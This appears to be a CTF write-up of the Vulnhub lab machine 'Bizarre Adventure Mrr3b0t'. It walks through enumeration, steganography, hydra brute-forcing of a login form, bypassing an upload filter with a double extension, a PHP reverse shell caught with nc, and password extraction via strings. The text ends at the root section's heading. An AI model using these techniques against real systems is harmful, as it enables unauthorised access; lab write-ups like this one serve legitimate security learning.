---
title: Vulnhub - Bizarre Adventure Mrr3b0t
description: My writeup on Bizarre Adventure Mrr3b0t box.
categories:
 - vulnhub
tags: vulnhub hydra stego reverse lxd
---

![](https://images-na.ssl-images-amazon.com/images/I/71Z2amvT-tL._AC_SL1062_.jpg)

You can find the machine there > [Bizarre Adventure Mrr3b0t](https://www.vulnhub.com/entry/bizarre-adventure-mrr3b0t,561/){:target="_blank"}

## Summary

This box is really similar to Bizarre Adventure Sticky Fingers. Let's pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.13
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 01:34 EEST
Nmap scan report for mrr3b0t.zte.com.cn (192.168.1.13)
Host is up (0.00031s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
5355/tcp open  llmnr
MAC Address: 08:00:27:77:A5:67 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds
$ nmap -p 22,53,80,5355 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 01:34 EEST
Nmap scan report for mrr3b0t.zte.com.cn (192.168.1.13)
Host is up (0.00042s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:b7:f5:6b:0d:58:1d:7b:58:7d:1a:99:fb:b1:8f:04 (RSA)
|   256 66:b4:4b:40:e6:c9:76:93:31:aa:fc:ff:9a:40:a9:f9 (ECDSA)
|_  256 55:c6:b2:01:0f:16:1c:68:96:e2:bb:b1:fe:ff:59:c2 (ED25519)
53/tcp   open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Eskwela Template
5355/tcp open  llmnr?
```

We can see a static website, let's run `gobuster` on it.

```
$ gobuster dir -q -u http://$ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html                
/images (Status: 301)
/index.html (Status: 200)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
/administrator (Status: 301)
```

`/administrator` has a login panel, `/images` has a `flag.txt.txt` file in with a message:

```
$ curl http://$ip/images/flag.txt.txt
Almost!

Did you notice something hidden?
```

Hmm, then i noticed that under `/images` there is a `hidden.png` image. Ugh stego stuff! Why!? :disappointed: Anyway i tried the basics like `strings` but nothing. It's `.png` so we can't run `steghide` etc, one option left that is [Zsteg](https://github.com/zed-0xff/zsteg){:target="_blank"}! 

You can install it by:

```
$ gem install zsteg
```

```
$ zsteg -a hidden.png 
b1,r,lsb,xy         .. file: old packed data
b1,rgb,lsb,xy       .. text: "Did you find the message? Take the Mrrobot user and break your password, just don't think too much!"
```

## Shell as www-data

We have a user! `mrrobot` let's fire up hydra! :fire:

```
$ hydra -l mrrobot -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/administrator/index.php:username=mrrobot&pass=^PASS^:Login Failed"

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.1.13:80/administrator/index.php:username=mrrobot&pass=^PASS^:Login Failed
[80][http-post-form] host: 192.168.1.13   login: mrrobot   password: secret
```

We're in as `mrrobot:secret` & we can see an upload form:

![](https://i.imgur.com/Lw6pd9i.png)

If we try to upload a `.php` file we get an error message:

![](https://i.imgur.com/xCGkICy.png)

We can simply bypass that by upload a file like this `shell.jpg.php`, let's upload a php reverse shell and execute it.

```
$ curl http://$ip/administrator/shell.jpg.php
```

```
$ nc -lvp 5555              
listening on [any] 5555 ...

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@mrr3b0t:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as exploiter

Here i stuck for a while, was tricky!! Under `/var/www` we can see a `bf` directory, this directory has a 64bit ELF file in:

```
www-data@mrr3b0t:/var/www/bf$ file buffer
buffer: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d870ae3a0c4c68f57dede236b914138be4074732, not stripped
```

Let's do some basic reverse engineering, if we run `strings` we can see the password for user `exploiter`:

```
www-data@mrr3b0t:/var/www/bf$ strings buffer
...data..
 Digite a senha: 
MrR0b0t121
 Senha errada 
 Senha Correta 
Password@123
```

```
www-data@mrr3b0t:/var/www/bf$ su - exploiter
Password: Password@123

exploiter@mrr3b0t:~$ whoami;id 
exploiter
uid=1000(exploiter) gid=1000(exploiter) groups=1000(exploiter),24(cdrom),30(dip),46(plugdev),111(lxd),118(lpadmin),119(sambashare)
```

## Shell as root
